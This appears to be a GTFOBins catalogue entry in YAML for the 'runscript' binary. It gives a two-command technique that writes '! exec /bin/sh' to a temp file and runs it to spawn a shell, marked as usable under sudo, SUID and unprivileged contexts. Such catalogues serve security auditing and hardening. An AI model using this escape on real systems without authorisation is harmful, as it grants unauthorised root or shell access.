<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/runscript -->
---
functions:
  shell:
  - code: |-
      echo '! exec /bin/sh' >/path/to/temp-file
      runscript /path/to/temp-file
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
